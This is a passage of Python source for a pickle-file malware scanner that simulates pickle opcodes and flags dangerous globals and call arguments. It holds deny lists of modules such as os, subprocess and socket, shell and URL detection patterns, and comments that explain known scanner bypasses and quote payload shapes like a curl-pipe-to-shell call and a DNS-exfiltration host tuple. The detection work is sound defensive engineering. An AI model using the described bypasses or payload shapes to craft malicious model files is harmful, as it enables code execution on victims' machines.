    invoked, so the invocation marks `next`, not `attr_chain`. One hop is
    not the chain. Whenever a call is marked, the calls that produced its
    arguments are one step closer to the invocation too, so marking
    propagates backward through `chained_from` until nothing new is marked.
    Runs per pickle (chains cannot cross a STOP: memo and stack reset), over
    a handful of records, so the fixpoint is a few passes at most. `start`
    is the first index of the current pickle's calls, not a slice: a slice
    would copy the list and the marks would never land.
    """
    changed = True
    while changed:
        changed = False
        for i in range(start, len(calls)):
            call = calls[i]
            if not call.result_invoked:
                continue
            for ref in call.chained_from:
                for j in range(i - 1, start - 1, -1):
                    if calls[j].ref == ref and not calls[j].result_invoked:
                        calls[j] = dataclasses.replace(calls[j], result_invoked=True)
                        changed = True
                        break


def _walk_one_pickle(
    stream: io.BytesIO,
    globals_found: list[str],
    resolved_calls: list[PickleResolvedCall],
    memo_indices: set[int],
) -> None:
    """Walk exactly one pickle from `stream`, appending what it resolves.

    `memo_indices` collects every memo slot number this pickle stores into,
    for the out-of-band index check. It is filled in place rather than
    returned so the caller still has it after a stream that stops parsing
    partway.

    Consumes through that pickle's STOP opcode and leaves `stream` positioned
    at the next byte, so the caller can walk any pickle that follows.

    Resolves every GLOBAL/STACK_GLOBAL/INST/OBJ reference in the pickle
    to a `module.name` string, and additionally resolves any
    REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose arguments are literal
    constants to a `PickleResolvedCall` (callable + concrete args) -- e.g.
    resolving `os.system('curl ... | sh')` instead of just noting that
    `os.system` was referenced somewhere in the stream.

    Walks the opcode stream with a stack/memo simulation covering
    string/int/float/bytes pushes, memo ops, container opcodes
    (TUPLE*/LIST/DICT/SET* and their APPEND*/SETITEM*/ADDITEMS mutators),
    MARK, and the call-construction opcodes (REDUCE/NEWOBJ/NEWOBJ_EX/INST/
    OBJ/BUILD). Where a call's arguments can't be resolved to literals (e.g.
    built from another REDUCE's return value), only the bare callable
    reference is recorded, matching prior behavior -- this never guesses at
    a value. Raises whatever pickletools.genops raises on an unparseable
    stream -- callers should catch and fall back to a weaker signal.
    """
    import pickletools

    # Fresh per pickle: a real Unpickler starts each load() with an empty
    # stack and memo, so memo indices from an earlier pickle in the same file
    # must not be visible here.
    stack: list[Any] = []
    memo: dict[int, Any] = {}
    auto_memo_idx = 0

    def _record_call(callable_val: Any, args: Any, kwargs: dict | None = None) -> None:
        if isinstance(callable_val, _PickleCallResultType):
            # The pickle is invoking a value it computed earlier in the same
            # stream, rather than a global it named. Nothing about *this* call
            # can be reported (the callable has no name to report), but the
            # call that produced the callable is now known to have been
            # invoked, which is what the chain signal keys on. Mark the most
            # recent recording of that producer.
            for i in range(len(resolved_calls) - 1, -1, -1):
                if resolved_calls[i].ref == callable_val.ref:
                    resolved_calls[i] = dataclasses.replace(
                        resolved_calls[i], result_invoked=True
                    )
                    break
            return
        if not isinstance(callable_val, str):
            return
        if not isinstance(args, (tuple, list)):
            return
        args_tuple = tuple(args)
        kwargs_literal = kwargs is None or _is_pickle_literal(tuple(kwargs.values()))
        if _is_pickle_literal(args_tuple) and kwargs_literal:
            resolved_calls.append(
                PickleResolvedCall(callable_val, args_tuple, dict(kwargs) if kwargs else None)
            )
            return

        # Partially resolved: at least one argument is opaque, so `args` would
        # be a lie. Keep only the literal text that really is there. See
        # PickleResolvedCall.partial_texts for why discarding it was wrong.
        seen: list[str] = []
        chained: list[str] = []
        for value in _iter_pickle_arg_values((args_tuple, kwargs or {})):
            if isinstance(value, _PickleCallResultType):
                if value.ref not in chained and len(chained) < _PICKLE_MAX_PARTIAL_TEXTS:
                    chained.append(value.ref)
            elif (text := _pickle_arg_text(value)) is not None and text not in seen:
                if len(seen) < _PICKLE_MAX_PARTIAL_TEXTS:
                    seen.append(text)
            # Both collections are capped for the same reason: argument lists
            # are attacker-sized. Stop only once neither can grow.
            if len(seen) >= _PICKLE_MAX_PARTIAL_TEXTS and len(chained) >= _PICKLE_MAX_PARTIAL_TEXTS:
                break
        if seen or chained:
            # A call carrying no literal text still matters when it consumes a
            # computed value: `next(attr_chain(...))` is the intermediary link
            # in PickleCloak's resolver chains, and dropping it here broke the
            # result-invoked marking the chain signal needs (the final call
            # marks the most recent call with the callable's ref, which is
            # this one).
            resolved_calls.append(
                PickleResolvedCall(callable_val, (), None, tuple(seen), tuple(chained))
            )

    for op, arg, _pos in pickletools.genops(stream):
        name = op.name
        if (
            (name in _STRING_PUSH_OPCODES and isinstance(arg, str))
            or (name in _INT_PUSH_OPCODES and isinstance(arg, int))
            or (name in _FLOAT_PUSH_OPCODES and isinstance(arg, float))
        ):
            stack.append(arg)
        elif name in _BYTES_PUSH_OPCODES and isinstance(arg, (bytes, bytearray)):
            stack.append(bytes(arg))
        elif name == "NONE":
            stack.append(None)
        elif name == "NEWTRUE":
            stack.append(True)
        elif name == "NEWFALSE":
            stack.append(False)
        elif name in _OPAQUE_PUSH_OPCODES:
            # Opcodes that push a value this walk cannot know: a persistent-ID
            # lookup (PERSID/BINPERSID), a copyreg extension-registry lookup
            # (EXT1/EXT2/EXT4), or a protocol-5 out-of-band buffer
            # (NEXT_BUFFER). The *value* is unknowable, but the push is not
            # optional: skipping it desynchronizes the simulated stack against
            # the real VM for every subsequent opcode.
            #
            # That desync was a 3-byte evasion of the argument-evidence
            # re-triage. `EXT1` followed by `POP` leaves the real stack
            # untouched (push then pop) while this walk, having pushed
            # nothing, popped the *callable* instead -- so a
            # `pip.main('http://...')` that still executes on load resolved to
            # no call at all and fell from HIGH back to the suppressed INFO
            # bucket. Denied globals were never affected (`globals_found` is
            # recorded at GLOBAL time, independent of the stack), which is
            # exactly why this hid only in the unknown bucket, where every
            # bypass gadget already lives.
            stack.append(_PICKLE_OPAQUE)
        elif name == "BINPERSID":
            # Pops the pid off the stack and pushes the resolved object.
            if stack:
                stack[-1] = _PICKLE_OPAQUE
        elif name == "READONLY_BUFFER":
            # Wraps the buffer on top of the stack; depth is unchanged, and
            # the result is no more knowable than the input.
            if stack:
                stack[-1] = _PICKLE_OPAQUE
        elif name == "MARK":
            stack.append(_PICKLE_MARK)
        elif name == "EMPTY_TUPLE":
            stack.append(())
        elif name == "EMPTY_LIST":
            stack.append([])
        elif name == "EMPTY_DICT":
            stack.append({})
        elif name == "EMPTY_SET":
            stack.append(set())
        elif name == "TUPLE1":
            if stack:
                stack[-1] = (stack[-1],)
        elif name == "TUPLE2":
            if len(stack) >= 2:
                b, a = stack.pop(), stack.pop()
                stack.append((a, b))
        elif name == "TUPLE3":
            if len(stack) >= 3:
                c, b, a = stack.pop(), stack.pop(), stack.pop()
                stack.append((a, b, c))
        elif name == "TUPLE":
            stack.append(tuple(_pop_to_mark(stack)))
        elif name == "LIST":
            stack.append(_pop_to_mark(stack))
        elif name == "FROZENSET":
            stack.append(frozenset(_pop_to_mark(stack)))
        elif name == "APPEND":
            if len(stack) >= 2:
                value = stack.pop()
                if isinstance(stack[-1], list):
                    stack[-1].append(value)
        elif name == "APPENDS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], list):
                stack[-1].extend(items)
        elif name == "ADDITEMS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], set):
                stack[-1].update(items)
        elif name == "DICT":
            items = _pop_to_mark(stack)
            stack.append({items[i]: items[i + 1] for i in range(0, len(items) - 1, 2)})
        elif name == "SETITEM":
            if len(stack) >= 3:
                value, key = stack.pop(), stack.pop()
                if isinstance(stack[-1], dict):
                    with contextlib.suppress(TypeError):
                        stack[-1][key] = value
        elif name == "SETITEMS":
            items = _pop_to_mark(stack)
            if stack and isinstance(stack[-1], dict):
                for i in range(0, len(items) - 1, 2):
                    with contextlib.suppress(TypeError):
                        stack[-1][items[i]] = items[i + 1]
        elif name == "POP":
            if stack:
                stack.pop()
        elif name == "POP_MARK":
            _pop_to_mark(stack)
        elif name == "DUP":
            if stack:
                stack.append(stack[-1])
        elif name == "MEMOIZE":
            if stack:
                memo[auto_memo_idx] = stack[-1]
            if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
                memo_indices.add(auto_memo_idx)
            auto_memo_idx += 1
        elif name in _MEMO_STORE_OPCODES:
            if isinstance(arg, int):
                # Recorded even when the stack is empty: an index written by a
                # spliced block is evidence about the *writer* regardless of
                # whether this walk can model what it stored there. Bounded,
                # because that is otherwise a free memory amplification on
                # attacker-controlled bytes (see _MEMO_INDEX_MAX_TRACKED).
                if len(memo_indices) < _MEMO_INDEX_MAX_TRACKED:
                    memo_indices.add(arg)
                if stack:
                    memo[arg] = stack[-1]
        elif name in _MEMO_FETCH_OPCODES:
            if isinstance(arg, int) and arg in memo:
                stack.append(memo[arg])
        elif name == "GLOBAL" and isinstance(arg, str):
            # Protocol 0-2: arg is "module qualname" (space-separated).
            parts = arg.split(" ", 1)
            if len(parts) == 2:
                ref = f"{parts[0]}.{parts[1]}"
                globals_found.append(ref)
                if (laundered := _laundered_denied_ref(parts[1])) is not None:
                    globals_found.append(laundered)
                stack.append(_PickleGlobalRef(ref))
        elif name == "INST" and isinstance(arg, str):
            # Protocol 0's old-style-class instantiation opcode. Resolves a
            # callable through the identical find_class(module, name) path
            # GLOBAL uses -- pickletools.genops hands back the same
            # "module qualname" (space-separated) argument shape -- and then
            # calls it directly with whatever args were pushed since the
            # preceding MARK, without a separate REDUCE/BUILD opcode in
            # between. Undetected, this is a full bypass of the GLOBAL/
            # STACK_GLOBAL-only walk below. The mark-to-top values are the
            # call's actual arguments (e.g. the shell command passed to
            # os.system), so -- now that container/literal opcodes are
            # simulated -- they're captured as resolved-call evidence too,
            # not just consumed to keep the stack in sync.
            call_args = tuple(_pop_to_mark(stack))
            parts = arg.split(" ", 1)
            if len(parts) == 2:
                ref = f"{parts[0]}.{parts[1]}"
                globals_found.append(ref)
                if (laundered := _laundered_denied_ref(parts[1])) is not None:
                    globals_found.append(laundered)
                _record_call(ref, call_args)
                # Real semantics push the newly constructed *instance*, not
                # the class -- an opaque value, so a later opcode can't
                # mistake it for a re-usable global reference or literal.
                stack.append(_PickleCallResultType(ref))
        elif name == "OBJ":
            # Protocol 0's other old-style-instantiation opcode: like INST,
            # but the class is the first item after MARK (already resolved
            # to a ref string by an earlier GLOBAL) rather than encoded in
            # OBJ's own argument.
            items = _pop_to_mark(stack)
            cls_ref = items[0] if items else None
            if items:
                _record_call(cls_ref, tuple(items[1:]))
            stack.append(
                _PickleCallResultType(cls_ref) if isinstance(cls_ref, str) else _PICKLE_OPAQUE
            )
        elif name == "STACK_GLOBAL":
            # Protocol 4+: module and qualname were pushed as the two
            # preceding string constants.
            if len(stack) >= 2:
                qualname = stack.pop()
                module = stack.pop()
                ref = f"{module}.{qualname}"
                globals_found.append(ref)
                if isinstance(module, str) and isinstance(qualname, str):
                    if (laundered := _laundered_denied_ref(qualname)) is not None:
                        globals_found.append(laundered)
                stack.append(_PickleGlobalRef(ref))
        elif name == "REDUCE":
            if len(stack) >= 2:
                raw_args = stack.pop()
                callable_val = stack.pop()
                _record_call(callable_val, raw_args)
                stack.append(
                    _PickleCallResultType(callable_val)
                    if isinstance(callable_val, str) else _PICKLE_OPAQUE
                )
        elif name == "NEWOBJ":
            # Protocol 2+'s construction opcode -- how most modern PyTorch
            # pickles actually build tensors/objects (cls.__new__(cls, *args)).
            if len(stack) >= 2:
                raw_args = stack.pop()
                cls_val = stack.pop()
                _record_call(cls_val, raw_args)
                stack.append(
                    _PickleCallResultType(cls_val)
                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
                )
        elif name == "NEWOBJ_EX":
            if len(stack) >= 3:
                kwargs_val = stack.pop()
                raw_args = stack.pop()
                cls_val = stack.pop()
                _record_call(
                    cls_val,
                    raw_args,
                    kwargs_val if isinstance(kwargs_val, dict) else None,
                )
                stack.append(
                    _PickleCallResultType(cls_val)
                    if isinstance(cls_val, str) else _PICKLE_OPAQUE
                )
        elif name == "BUILD":
            # obj.__setstate__(state) / obj.__dict__.update(state) mutates
            # obj in place and returns nothing -- the state argument is
            # popped, and obj (pushed by the preceding REDUCE/NEWOBJ/NEWOBJ_EX)
            # is left on top of the stack unchanged. Needed purely to keep
            # later opcodes from desyncing; BUILD itself doesn't call
            # arbitrary code.
            if stack:
                stack.pop()


# Modules where *any* member is denied, matched on the module prefix rather
# than an exact `module.name`. Adopted from picklescan's `_unsafe_globals`
# wildcard entries (MIT).
#
# This reverses an earlier judgement in this branch, and the reversal is worth
# recording because the first call was made on reasoning and the second on
# measurement. The original decision took picklescan's 57 explicit names and
# skipped its 36 wildcards, on the grounds that a whole-module deny costs
# precision -- citing its `uuid: *` entry, which reports an ordinary pickled
# `uuid.UUID` as a dangerous import.
#
# Scored against picklescan's own 46-file corpus, that choice cost **9 of 35
# detections**: `httplib.HTTPSConnection`, `aiohttp.client.ClientSession`,
# `sys.exit`, `pickle.loads`, `_pickle.loads`, `bdb.Bdb`, `bdb.Bdb.run`,
# `pip.main` and `pydoc.pipepager` all sit in wildcarded modules and all landed
# in the unknown bucket. This scanner scored 54% there while scoring 100% on the
# corpus written alongside it, which is what an author-written benchmark is
# worth.
#
# The precision worry did not survive contact with data: across 12 real benign
# models (torch zip, torch legacy, raw and zlib joblib, sklearn with custom
# classes) **none** of the 36 modules occurs even once. picklescan ships these
# wildcards inside HuggingFace's own scanning, so they run against far more
# real-world models than any corpus here.
#
# `uuid` is the sole exclusion, because it is the one entry with a
# demonstrated false positive: `uuid.UUID` is an ordinary pickled value.
# Everything reachable in `uuid` that matters (its ctypes loading) is denied
# through `ctypes` anyway.
_PICKLE_DENIED_MODULES: frozenset[str] = frozenset({
    "_aix_support", "_osx_support", "_pickle", "_pyrepl", "aiohttp", "asyncio",
    "bdb", "cProfile", "commands", "ctypes", "distutils.file_util", "httplib",
    "nt", "numpy.f2py", "numpy.testing._private.utils", "os", "pdb", "pickle",
    "pip", "posix", "profile", "pty", "pydoc", "requests.api", "runpy",
    "shutil", "socket", "ssl", "subprocess", "sys", "test", "timeit",
    "urllib.request", "venv", "webbrowser",
})


def _is_denied_pickle_module(ref: str) -> bool:
    """True if `ref` belongs to a wholly-denied module.

    Matches on dotted-component boundaries so `pickle.loads` and
    `urllib.request.urlopen` match while `pickletools.dis` and `ossaudiodev`
    do not -- a bare `startswith` would deny anything merely beginning with
    those letters.
    """
    for module in _PICKLE_DENIED_MODULES:
        if ref == module or ref.startswith(module + "."):
            return True
    return False


def _classify_pickle_global(ref: str) -> str:
    """Classify a resolved `module.name` global as denied/allowed/unknown."""
    if ref in PICKLE_DENIED_GLOBALS:
        return "denied"
    # Allow-list wins over the module wildcard: `torch.serialization._get_layout`
    # and the numpy rebuild helpers are legitimate members of otherwise
    # uninteresting modules, and none of the wildcarded modules overlaps the
    # allow list today -- but the ordering makes that safe if one ever does.
    if ref in PICKLE_ALLOWED_GLOBALS or _is_ml_constructor_allowed(ref):
        return "allowed"
    if _is_denied_pickle_module(ref):
        return "denied"
    module, _, name = ref.rpartition(".")
    if module in _PICKLE_ALLOWED_STORAGE_PARENTS and _PICKLE_STORAGE_NAME_RE.match(name):
        return "allowed"
    root = module.partition(".")[0]
    if root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and _PICKLE_ML_CLASS_NAME_RE.match(name):
        return "allowed"
    return "unknown"


def _laundered_denied_ref(qualname: str) -> str | None:
    """The denied callable a dotted GLOBAL *name* reaches by attribute walk.

    A deny list keyed on the joined `module.name` string is bypassed by moving
    the interesting half into the name. CPython's `Unpickler.find_class`, for
    protocol 4 and above, resolves the name with `pickle._getattribute`, which
    splits on "." and getattrs each segment in turn. So

        GLOBAL "torch.serialization" "os.system"

    resolves to `os.system` on load, while the joined ref this walk records is
    `torch.serialization.os.system`, which is on no list and lands in the
    unknown bucket. Any module that does `import os` works as the prefix --
    logging, shutil, zipfile, pathlib, tarfile and platform all do -- so the
    supply of benign-looking prefixes is effectively unlimited and no amount of
    adding names to the deny list closes it.

    Every tail of the qualname is reachable, not just the whole of it, because
    the walk is per-segment: `_getattribute(os, "path.os.system")` succeeds the
    same way. The module half is not traversed (it is a single `sys.modules`
    lookup), so tails starting inside it are not candidates.

    Returns the first tail that is already denied, or None. Deliberately
    narrow: nothing is reported unless it resolves to something the deny list
    already covers, so a benign dotted qualname such as a nested class
    `Outer.Inner` is unaffected. Not gated on the protocol byte -- a dotted
    name that spells a denied callable is evidence of intent even in a
    protocol-2 stream where it would fail to load.
    """
    if "." not in qualname:
        return None
    parts = qualname.split(".")
    for i in range(len(parts) - 1):
        candidate = ".".join(parts[i:])
        if _classify_pickle_global(candidate) == "denied":
            return candidate
    return None


# ── Unknown-bucket re-triage ────────────────────────────────────────
#
# An unknown global is one that is on neither list, and that bucket is where
# every publicly documented picklescan bypass lands: `torch.utils.collect_env
# .run` (CVE-2025-71350), `pip.main` (CVE-2025-1716), `linecache`/`ssl` used
# for DNS exfiltration (CVE-2025-46417), `builtins.getattr` and
# `operator.attrgetter` chains. Reporting all of them at INFO with the words
# "likely a legitimate custom class" put the working bypasses in the tier
# triagers suppress -- the allow/deny/unknown split was doing its job and the
# severity assignment was throwing the result away.
#
# The re-triage below deliberately keys on *evidence*, not on names, because a
# new list of bad names would inherit the same completeness problem that
# created this gap. Every signal reads the resolved call arguments -- what the
# callable would actually be invoked with -- which the opcode walk already
# recovers. Nothing reads the callable's own name.
#
# Note what is deliberately NOT a signal: whether the global is invoked at all.
# That was the obvious first cut, and it does not work -- a benign pickle
# containing any custom class produces `mypackage.MyModel()` as a resolved
# call just as surely as a gadget does, so escalating on invocation alone
# would escalate essentially every model file with a custom class in it.
# Invocation is a precondition for the argument signals, not evidence itself.

_PICKLE_ARG_URL_RE = re.compile(r"\b[a-z][a-z0-9+.\-]{1,15}://", re.I)
# A shell metacharacter adjacent to whitespace, i.e. used as an operator
# rather than merely present. `curl http://x | sh` matches; an ordinary
# value like `a;b` or a base64 blob containing `+/=` does not.
_PICKLE_ARG_SHELL_RE = re.compile(r"\$\(|`|\s[;&|]|[;&|]\s")
# Callables that rebuild a code object or a function from its parts. Every
# code object carries co_filename, the absolute path of the source it was
# compiled from, so a path argument here is structural metadata rather than a
# choice the pickle's author made. Measured on SafePickle's benign half: 81 of
# 644 real models were promoted to a LOW finding on strings like
# "/nfs/staff-hdd/.../site-packages/timm/layers/conv2d_same.py".
#
# The same applies to the identifier arguments. dill and cloudpickle serialise
# a function together with the names its body references, so a function that
# calls compile() or open() carries those names as data. Reading them as a
# getattr/attrgetter chain resolving a denied callable is the same mistake as
# reading co_filename as a chosen path: 80 more of SafePickle's 644 benign
# models were promoted this way.
#
# Suppressed for these callables: the path signal and the attribute-name
# signal. Still promoting: a URL, a shell-shaped string, a (host, port) pair,
# and a literal that is Python *source* resolving a denied callable. None of
# those is anything a code object carries by construction, and the real sink
# in a dill-based gadget is still reached by MFV-PICKLE-001.
_PICKLE_CODE_OBJECT_BUILDERS: frozenset[str] = frozenset({
    "dill._dill._create_code",
    "dill._dill._create_function",
    "dill._dill._create_type",
    "cloudpickle.cloudpickle._make_function",
    "cloudpickle.cloudpickle._make_skel_func",
    "cloudpickle.cloudpickle._builtin_type",
    "types.CodeType",
    "types.FunctionType",
    "marshal.loads",
})


# Callables whose first argument is a pattern, not a command. A regex is dense
# with the same characters a shell line uses (| ^ $ ( ) . *), so running the
# command-shape patterns over one measures how complex the regex is. 40 of
# SafePickle's benign models were promoted on tokeniser patterns like
# "^§|^%|^=|^—|^–|^\\+(?![0-9])".
_PICKLE_PATTERN_ARG_CALLABLES: frozenset[str] = frozenset({
    "re._compile", "re.compile", "regex._compile", "regex.compile",
})


_PICKLE_ARG_PATH_RE = re.compile(r"^(?:/|~/|[A-Za-z]:[\\/])|\.\.[\\/]")
_PICKLE_ARG_HOSTNAME_RE = re.compile(
    r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9\-]+$"
)

# Attribute names of the callables already on the deny list, e.g. "system"
# from "os.system". An unknown callable handed one of these as a literal
# string is the shape of a `getattr(module, "system")` / `attrgetter("system")`
# chain resolving a denied callable dynamically -- the exact move that keeps
# the denied name out of the opcode stream where a deny list would see it.
# Derived from the existing deny list rather than written out fresh, so it
# carries no new completeness debt.
#
# This started as a length rule (keep dunders and names of 6+ characters) on
# the theory that short names are ordinary English and would fire on benign
# arguments. That was exactly backwards for the names that matter: it dropped
# `eval`, `exec`, `popen`, `fork`, `spawn` and `CDLL` -- the canonical targets
# of `getattr(module, "eval")`, which is the chaining technique Slaviero
# documented in 2011 and every guide since has repeated. Length was a proxy
# for "reads as an ordinary word"; the proxy is now replaced by naming the
# handful of entries that genuinely do.
_PICKLE_GENERIC_ATTR_NAMES: frozenset[str] = frozenset({
    # Ordinary vocabulary that plausibly appears as a literal string in
    # legitimate model metadata (a stage name, a mode, a config value).
    "run", "call", "get", "load", "loads", "open", "apply", "remove", "start",
})
_PICKLE_DENIED_ATTR_NAMES: frozenset[str] = frozenset(
    name
    for name in (ref.rpartition(".")[2] for ref in PICKLE_DENIED_GLOBALS)
    if name not in _PICKLE_GENERIC_ATTR_NAMES
)


# Allowlisted callables that legitimately receive a string argument. Everything
# else on the allow list reconstructs a container, a tensor or a dtype from
# structural data and never takes free text.
#
# This is a *type contract*, not a badness list, and it is complete over
# PICKLE_ALLOWED_GLOBALS because that list is ours. That completeness is the
# point: a badness list cannot be complete, but "which of my own 25 allowlisted
# entries accept a string" can be.
_PICKLE_ALLOWED_STRING_ARG_OK: frozenset[str] = frozenset({
    "_codecs.encode",                    # _codecs.encode('\\xe9', 'latin1')
    "numpy.dtype",                       # numpy.dtype('f8')
    "torch.serialization._get_layout",   # torch.serialization._get_layout('torch.strided')
    "torch.device",                      # torch.device('cuda', 0): device names are strings
    # numpy.core.multiarray._reconstruct('numpy.ndarray', shape, dtype) is how
    # every ndarray pickled under protocols 0/1 reduces: the subtype arrives as
    # a *string*, not a global ref. Any numpy-bearing pickle old enough to be
    # in text form carries exactly this call, so the string-argument premise is
    # false at the source for this one callable. Both module spellings appear
    # in the wild (numpy < 2 vs >= 2). An attacker who has trojaned numpy gains
    # nothing extra from the string: _reconstruct is already theirs to abuse.
    "numpy.core.multiarray._reconstruct",
    "numpy._core.multiarray._reconstruct",
    # Same era, same shape: scalar(dtype_code, bytes) pickled under protocols
    # 0/1 carries the dtype as a string code ('i8', 'f8'). Measured on a real
    # sklearn StandardScaler from the quickset benign corpus.
    "numpy.core.multiarray.scalar",
    "numpy._core.multiarray.scalar",
})


def _allowed_call_has_anomalous_string(ref: str, call: PickleResolvedCall | None) -> str | None:
    """Return a reason if an allowlisted callable is handed free text it has no
    legitimate use for, else None.

    This is what catches ShadowPickle's Overwritten Module variant, which is
    reported at 63% evasion and 0% detection by both picklescan and ModelScan.
    That attack never names anything dangerous: it calls
    `collections.OrderedDict("ls -la")` and relies on a trojaned `collections`
    in the victim environment to execute the string.

    Deliberately a shape check rather than a content check. The payloads in
    that work include `ls -la` and multi-line Python source, neither of which
    trips the URL, shell-metacharacter or leading-path patterns used elsewhere
    in this module -- and chasing those patterns would be an arms race over
    string contents. What does not vary is that a mapping or tensor
    reconstructor has no reason to receive free text at all, whatever that
    text says.
    """
    if call is None or ref in _PICKLE_ALLOWED_STRING_ARG_OK:
        return None
    texts = [
        text
        for text in (
            _pickle_arg_text(v)
            for v in _iter_pickle_arg_values((call.args, call.kwargs or {}))
        )
        if text
    ]
    if not texts:
        return None
    longest = max(texts, key=len)
    return (
        f"is allowlisted but is invoked with a string argument "
        f"({_PICKLE_ARG_REPR.repr(longest)}), which it has no legitimate use for"
    )


# Upper bound on an argument string this walk is willing to hand to
# `ast.parse`. Parsing is the one place a *value* (not merely its shape)
# drives real work, and these bytes are attacker-chosen; a megabyte of
# pathological nesting is cheap to write and not cheap to parse. Real
# one-liner payloads are tens of characters, so the bound costs no recall.
_PICKLE_MAX_SOURCE_PARSE_BYTES = 4096


def _iter_pickle_source_targets(text: str):
    """Yield every dotted callable name `text` would resolve if executed as
    Python.

    This generalises the existing "argument names a denied global" check from
    an exact string match to the language's own grammar. That check compares
    the whole argument against the classifier, so it sees ``'os.system'`` but
    not ``"__import__('os').system('ls')"`` -- and the second is what an
    eval-family gadget is actually handed, because the gadget needs an
    expression, not a name.

    The mechanism is unchanged and no new list appears: the caller re-runs
    `_classify_pickle_global` over what comes out of here. What changes is
    that the target is recovered through Python syntax instead of requiring
    the attacker to have written it bare. The interchangeable part is the
    evaluator (`sympify`, `eval_expr`, `lambdify`, a logging config's
    ``class=``, an `sT` repr round-trip); the part that cannot vary is that
    the source names something that executes.
    """
    if len(text) > _PICKLE_MAX_SOURCE_PARSE_BYTES or "(" not in text:
        # No call syntax means no callable is resolved, whatever else the
        # string parses to. Bare dotted names are already covered by the
        # exact-match check, and requiring a parenthesis keeps ordinary
        # metadata out of the parser entirely.
        return
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, MemoryError, RecursionError):
        # Not Python. By far the common case for a benign string, and the
        # reason this is safe to run over every argument.
        return

    def dotted(node: Any) -> str | None:
        """Reconstruct the dotted name a value-expression denotes, or None."""
        if isinstance(node, ast.Name):
            return node.id
        if isinstance(node, ast.Attribute):
            base = dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        if isinstance(node, ast.Call):
            # `__import__('os')` and `importlib.import_module('os')` denote
            # the module they name, which is what makes
            # `__import__('os').system` reconstruct as `os.system`. Handled
            # inside the recursion so it composes with attribute access at
            # any depth rather than being a top-level special case.
            func = dotted(node.func)
            if func in ("__import__", "importlib.import_module") and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    return first.value
            return func
        return None

    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = dotted(node.func)
            if name:
                yield name
        elif isinstance(node, ast.Import):
            for alias in node.names:
                yield alias.name
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                for alias in node.names:
                    yield f"{node.module}.{alias.name}"


def _pickle_source_denied_target(text: str) -> str | None:
    """Return the first denied callable `text` would resolve as Python, if any."""
    for name in _iter_pickle_source_targets(text):
        if _classify_pickle_global(name) == "denied" or _is_denied_pickle_module(name):
            return name
    return None


def _iter_pickle_arg_values(value: Any, _seen: set[int] | None = None):
    """Yield every scalar nested anywhere inside a resolved argument value.

    Recurses over container depth an attacker controls (nested TUPLE1 opcodes),
    and unlike the opcode walk this runs outside `_scan_pickle`'s try/except,
    so a RecursionError here would escape rather than degrade. It cannot reach
    one: `_is_pickle_literal` walks the identical structure first, from deeper
    in the stack inside `_resolve_pickle_globals`, so any nesting deep enough
    to overflow is rejected before a call is ever recorded (verified
    exhaustively over nesting depths 1..699 -- the limit trips at ~500 and
    always inside the guarded walk). Keep that ordering if either is moved.

    Shared containers are visited once, for the same reason `_is_pickle_literal`
    memoizes: `DUP` makes the simulated stack a DAG, and re-walking shared
    subtrees turns a 73-byte file into exponential work. A value that appears
    twice adds no evidence the first occurrence did not already provide.
    """
    if _seen is None:
        _seen = set()
    if isinstance(value, (tuple, list, set, frozenset, dict)):
        marker = id(value)
        if marker in _seen:
            return
        _seen.add(marker)
    if isinstance(value, (tuple, list, set, frozenset)):
        for item in value:
            yield from _iter_pickle_arg_values(item, _seen)
    elif isinstance(value, dict):
        for key, item in value.items():
            yield from _iter_pickle_arg_values(key, _seen)
            yield from _iter_pickle_arg_values(item, _seen)
    else:
        yield value


def _pickle_arg_text(value: Any) -> str | None:
    """Return `value` as text if it is a string, or bytes that are entirely
    printable ASCII; otherwise None.

    A `_PickleGlobalRef` is excluded first: it is a resolved class reference
    (an object), not free text, whatever its string rendering suggests. The
    printability gate matters: binary argument blobs are routine in real
    pickles (`datetime.datetime(b'\\x07\\xe4\\x01\\x01...')` is the canonical
    one) and raw bytes contain `|`, `;` and `&` constantly. Running the
    command-shape patterns over decoded binary would turn every pickled
    datetime into a HIGH finding.
    """
    if isinstance(value, _PickleGlobalRef):
        return None
    if isinstance(value, str):
        return value
    if isinstance(value, (bytes, bytearray)):
        try:
            text = value.decode("ascii")
        except UnicodeDecodeError:
            return None
        return text if text.isprintable() else None
    return None


def _iter_pickle_host_port_pairs(value: Any, _seen: set[int] | None = None):
    """Yield every ``(hostname, port)``-shaped 2-tuple nested in `value`.

    Structural rather than name-based: a dotted hostname paired with an
    integer in port range is the socket-address literal, which is how the
    DNS-exfiltration gadgets are parameterized
    (``ssl.get_server_certificate(("<exfil>.attacker.tld", 443))``).
    """
    if _seen is None:
        _seen = set()
    if isinstance(value, (tuple, list, dict)):
        marker = id(value)
        if marker in _seen:
            return
        _seen.add(marker)
    if isinstance(value, dict):
        for item in value.values():
            yield from _iter_pickle_host_port_pairs(item, _seen)
    elif isinstance(value, (tuple, list)):
        if (
            len(value) == 2
            and isinstance(value[0], str)
            and isinstance(value[1], int)
            and not isinstance(value[1], bool)
            and 0 < value[1] <= 65535
            and _PICKLE_ARG_HOSTNAME_RE.match(value[0])
        ):
            yield value[0], value[1]
        for item in value:
            yield from _iter_pickle_host_port_pairs(item, _seen)


# A pickle stream begins with a PROTO opcode (protocols 2 and up) or one of
# the handful of opcodes a protocol-0 or -1 stream can open with.
_NESTED_PICKLE_OPENERS = (b"\x80", b"(", b"]", b"}", b"c", b"\x8c", b"\x95")


def _nested_pickle_globals(blob: bytes) -> list[str] | None:
    """Globals referenced by a pickle stream carried inside a bytes literal.

    Resolution is delegated to the same walker the outer stream uses, so
    STACK_GLOBAL and the memo behave identically one level down. A hand-rolled
    opcode scan here saw only ``<stack_global>`` and missed every protocol-4
    payload, which is most of them.
    """
    if not isinstance(blob, (bytes, bytearray)) or len(blob) < 4:
        return None
    if bytes(blob[:1]) not in _NESTED_PICKLE_OPENERS:
        return None
    try:
        names, _calls, _memo = _resolve_pickle_globals(bytes(blob))
